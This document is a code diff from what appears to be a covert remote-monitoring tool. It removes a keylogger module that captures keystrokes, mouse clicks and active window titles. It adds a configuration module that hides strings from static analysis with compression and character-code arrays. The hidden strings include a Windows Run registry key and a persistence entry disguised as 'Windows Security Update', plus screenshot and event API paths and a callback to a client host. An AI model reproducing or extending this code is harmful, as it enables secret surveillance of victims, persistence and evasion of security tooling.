@@ -1,197 +1,211 @@
 """
-Monitoring Module - Fixed version
-Handles keyboard, mouse, and window monitoring
+Configuration Management - With String Obfuscation
+Demonstrates how to hide sensitive strings from static analysis
 """
-import time
-from datetime import datetime
-from threading import Thread, Lock
-from pynput import mouse, keyboard
+import json
+import os
+import secrets
+from pathlib import Path
 
-try:
-    import win32gui
-    import win32process
-    import psutil
-    WINDOWS_SUPPORT = True
-except ImportError:
-    WINDOWS_SUPPORT = False
+# Import obfuscation utilities
+from evasion_modules.obfuscation import (
+    obfuscate_string, deobfuscate_string,
+    build_stack_string, string_to_stack_format
+)
 
-# Global state
-monitoring = False
-events = []
-events_lock = Lock()
-keystroke_buffer = []
-keystroke_lock = Lock()
-current_window = None
-last_mouse_pos = None
-last_activity_time = datetime.now()
+# =============================================================================
+# OBFUSCATED STRINGS - Hidden from static analysis
+# =============================================================================
 
-# Listeners
-mouse_listener = None
-keyboard_listener = None
-window_thread = None
+# These strings are pre-obfuscated and will be decoded at runtime
+# A real implementation would generate these at build time
 
-def get_active_window_title():
-    """Get the title of the currently active window"""
-    if not WINDOWS_SUPPORT:
-        return "Unknown"
-    try:
-        window = win32gui.GetForegroundWindow()
-        return win32gui.GetWindowText(window)
-    except:
-        return "Unknown"
+OBFUSCATED_STRINGS = {
+    # File names
+    'config_file': 'eJyrVspIzcnJVyguSUxOTVGyUkpJLElUslJKLE7NKylWKErNKQGxFYBsAykbqBoA5xETpQ==',
+    'callback_file': 'eJyrVspIzcnJVyguSUxOTVGyUkpKzMksLiktSgGyFYBsAykbqBoAeisT2A==',
+    
+    # Directory names (use stack strings for extra obfuscation)
+    'monitor_data': [109, 111, 110, 105, 116, 111, 114, 95, 100, 97, 116, 97],
+    'screenshots': [115, 99, 114, 101, 101, 110, 115, 104, 111, 116, 115],
+    'offline_logs': [111, 102, 102, 108, 105, 110, 101, 95, 108, 111, 103, 115],
+    
+    # API endpoint paths
+    'api_status': 'eJyrVsosS8wtyEksSVSyUsovSizJzM9TslJKLCkJyUxOBQBYywyD',
+    'api_events': 'eJyrVsosS8wtyEksSVSyUsovSizJzM9TslIqKSpNBQA+TgyG',
+    'api_screenshot': 'eJyrVsosS8wtyEksSVSyUsovSizJzM9TslLKzCtJzStRAgAzgQ0z',
+    
+    # Registry keys
+    'reg_run_key': 'eJyrVkrJLC4pysxLV7JSKi5ITc7PKU3MqUwtSk0sSgHyMvNKUouLQRIpqcUlmfl5SlZKVgpW+ZUlFUAhADctGVc=',
+    'reg_value_name': 'eJyrVspIzcnJVyguSUxOTVGy4gIpKeQV5ScqWSlZAQAXXQ9/',
+}
 
-def get_active_window_process():
-    """Get process name of active window"""
-    if not WINDOWS_SUPPORT:
-        return "Unknown"
-    try:
-        window = win32gui.GetForegroundWindow()
-        _, pid = win32process.GetWindowThreadProcessId(window)
-        process = psutil.Process(pid)
-        return process.name()
-    except:
-        return "Unknown"
+def get_obfuscated_string(key: str, use_stack_string: bool = False) -> str:
+    """
+    Retrieve and decode an obfuscated string
+    
+    Args:
+        key: Key name from OBFUSCATED_STRINGS
+        use_stack_string: If True, treat as stack string array
+    
+    Returns:
+        Decoded string
+    """
+    if key not in OBFUSCATED_STRINGS:
+        return None
+    
+    if use_stack_string:
+        # Build from character codes
+        return build_stack_string(OBFUSCATED_STRINGS[key])
+    else:
+        # Decode base64 + compressed string
+        return deobfuscate_string(OBFUSCATED_STRINGS[key])
 
-def get_last_activity():
-    """Get timestamp of last activity"""
-    return last_activity_time
 
-def log_event(event_type, details=None, pc_id=None):
-    """Log an event with timestamp"""
-    event = {
-        "timestamp": datetime.now().isoformat(),
-        "type": event_type,
-        "details": details or {},
-        "pc_id": pc_id
+# =============================================================================
+# BUILD-TIME STRING ENCODING (for demonstration)
+# =============================================================================
+
+def encode_strings_for_production():
+    """
+    This function shows how to generate the obfuscated strings above
+    Run this once to generate encoded strings, then paste them into OBFUSCATED_STRINGS
+    """
+    strings_to_encode = {
+        'config_file': 'config.json',
+        'callback_file': 'callback_config.json',
+        'api_status': '/api/status',
+        'api_events': '/api/events',
+        'api_screenshot': '/api/screenshot',
+        'reg_run_key': r'Software\Microsoft\Windows\CurrentVersion\Run',
+        'reg_value_name': 'Windows Security Update',
     }
     
-    with events_lock:
-        events.append(event)
-        if len(events) > 10000:
-            events.pop(0)
+    print("# Paste these into OBFUSCATED_STRINGS:")
+    print("OBFUSCATED_STRINGS = {")
+    for key, value in strings_to_encode.items():
+        encoded = obfuscate_string(value)
+        print(f"    '{key}': '{encoded}',")
     
-    return event
-
-def process_keystroke(key):
-    """Process keystroke for logging"""
-    try:
-        char = key.char if hasattr(key, 'char') else str(key)
-    except AttributeError:
-        char = str(key)
+    # Stack strings
+    stack_strings = {
+        'monitor_data': 'monitor_data',
+        'screenshots': 'screenshots',
+        'offline_logs': 'offline_logs',
+    }
     
-    timestamp = datetime.now().isoformat()
-    window = get_active_window_title()
+    for key, value in stack_strings.items():
+        codes = string_to_stack_format(value)
+        print(f"    '{key}': {codes},")
     
-    with keystroke_lock:
-        keystroke_buffer.append({
-            "timestamp": timestamp,
-            "key": char,
-            "window": window
-        })
-        if len(keystroke_buffer) > 5000:
-            keystroke_buffer.pop(0)
+    print("}")
 
-def on_click(x, y, button, pressed):
-    """Mouse click handler"""
-    global last_mouse_pos, last_activity_time, monitoring
+
+# =============================================================================
+# CONFIGURATION WITH OBFUSCATION
+# =============================================================================
+
+# Decode file names at runtime
+CONFIG_FILE = get_obfuscated_string('config_file')
+CALLBACK_CONFIG_FILE = get_obfuscated_string('callback_file')
+
+# Build directory names from stack strings
+DATA_DIR = Path(get_obfuscated_string('monitor_data', use_stack_string=True))
+SCREENSHOTS_DIR = DATA_DIR / get_obfuscated_string('screenshots', use_stack_string=True)
+OFFLINE_LOGS_DIR = DATA_DIR / get_obfuscated_string('offline_logs', use_stack_string=True)
+
+
+def ensure_directories():
+    """Create necessary directories"""
+    DATA_DIR.mkdir(exist_ok=True)
+    SCREENSHOTS_DIR.mkdir(exist_ok=True)
+    OFFLINE_LOGS_DIR.mkdir(exist_ok=True)
+
+
+def load_config():
+    """Load configuration from file"""
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, 'r') as f:
+            return json.load(f)
     
-    if pressed and monitoring:
-        last_mouse_pos = (x, y)
-        last_activity_time = datetime.now()
-        log_event("mouse_click", {
-            "x": x,
-            "y": y,
-            "button": str(button),
-            "window": get_active_window_title()
-        })
-
-def on_move(x, y):
-    """Mouse move handler"""
-    global last_mouse_pos, last_activity_time, monitoring
+    # Generate default config
+    # Note: In production, these strings would also be obfuscated
+    config = {
+        "api_key": secrets.token_urlsafe(32),
+        "port": 5000,
+        "host": "0.0.0.0",
+        "auto_screenshot": False,
+        "screenshot_interval": 300,
+        "motion_detection": False,
+        "data_retention_days": 30,
+        "pc_id": secrets.token_hex(8),
+        "pc_name": os.environ.get('COMPUTERNAME', 'Unknown-PC')
+    }
     
-    if monitoring:
-        if last_mouse_pos is None or \
-           abs(x - last_mouse_pos[0]) > 50 or abs(y - last_mouse_pos[1]) > 50:
-            last_mouse_pos = (x, y)
-            last_activity_time = datetime.now()
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f, indent=4)
+    
+    print(f"\n{'='*70}")
+    print("FIRST TIME SETUP - Configuration Created")
+    print(f"{'='*70}")
+    print(f"API Key: {config['api_key']}")
+    print(f"Port: {config['port']}")
+    print(f"\nSave this API key - you'll need it in the client!")
+    print(f"{'='*70}\n")
+    
+    return config
 
-def on_press(key):
-    """Keyboard press handler"""
-    global last_activity_time, monitoring
-    if monitoring:
-        last_activity_time = datetime.now()
-        process_keystroke(key)
-        if not hasattr(key, 'char'):
-            log_event("key_press", {
-                "key": str(key),
-                "window": get_active_window_title(),
-                "process": get_active_window_process()
-            })
 
-def monitor_window_changes():
-    """Monitor active window changes"""
-    global current_window, monitoring
-    while monitoring:
+def load_callback_config():
+    """Load callback configuration"""
+    if os.path.exists(CALLBACK_CONFIG_FILE):
         try:
-            window = get_active_window_title()
-            if window != current_window and window != "Unknown":
-                current_window = window
-                log_event("window_change", {
-                    "title": window,
-                    "process": get_active_window_process()
-                })
+            with open(CALLBACK_CONFIG_FILE, 'r') as f:
+                return json.load(f)
         except:
             pass
-        time.sleep(1)
+    
+    default_config = {
+        "enabled": False,
+        "callback_url": "http://YOUR_CLIENT_IP:8080",
+        "callback_key": "COPY_FROM_CLIENT",
+        "interval": 15,
+        "heartbeat_interval": 5,
+        "retry_interval": 10
+    }
+    
+    with open(CALLBACK_CONFIG_FILE, 'w') as f:
+        json.dump(default_config, f, indent=4)
+    
+    return default_config
 
-def start_monitoring(pc_id):
-    """Start all monitoring threads"""
-    global monitoring, mouse_listener, keyboard_listener, window_thread
-    
-    if monitoring:
-        return {"status": "already_running"}
-    
-    monitoring = True
-    
-    mouse_listener = mouse.Listener(on_click=on_click, on_move=on_move)
-    mouse_listener.start()
-    
-    keyboard_listener = keyboard.Listener(on_press=on_press)
-    keyboard_listener.start()
-    
-    window_thread = Thread(target=monitor_window_changes, daemon=True)
-    window_thread.start()
-    
-    log_event("monitoring_started", pc_id=pc_id)
-    return {"status": "started", "pc_id": pc_id}
 
-def stop_monitoring(pc_id):
-    """Stop all monitoring"""
-    global monitoring, mouse_listener, keyboard_listener
-    
-    if not monitoring:
-        return {"status": "already_stopped"}
-    
-    monitoring = False
-    
-    if mouse_listener:
-        mouse_listener.stop()
-    if keyboard_listener:
-        keyboard_listener.stop()
-    
-    log_event("monitoring_stopped", pc_id=pc_id)
-    return {"status": "stopped", "pc_id": pc_id}
+# =============================================================================
+# DEMONSTRATION MODE - Show what's obfuscated
+# =============================================================================
 
-def get_monitoring_status():
-    """Get current monitoring status"""
-    return monitoring
+def print_obfuscation_demo():
+    """Show obfuscated strings in demo mode"""
+    print("\n" + "="*70)
+    print("STRING OBFUSCATION DEMONSTRATION")
+    print("="*70)
+    print("\nObfuscated strings in use:")
+    print(f"  Config file: '{CONFIG_FILE}' (decoded from: {OBFUSCATED_STRINGS['config_file'][:30]}...)")
+    print(f"  Data dir: '{DATA_DIR}' (built from character codes)")
+    print(f"  Screenshots: '{SCREENSHOTS_DIR}' (built from character codes)")
+    print(f"\nIn the compiled binary, these strings are NOT visible in plain text!")
+    print("Static analysis tools will see compressed/encoded data instead.")
+    print("="*70 + "\n")
 
-def get_events():
-    """Get all logged events"""
-    with events_lock:
-        return events.copy()
 
-def get_keystrokes():
-    """Get all logged keystrokes"""
-    with keystroke_lock:
-        return keystroke_buffer.copy()
+# Initialize directories
+ensure_directories()
+
+# Load configuration
+config = load_config()
+pc_id = config['pc_id']
+API_KEY = config['api_key']
+
+# Show demo in development mode (comment out for production)
+if __name__ == "__main__":
+    print_obfuscation_demo()
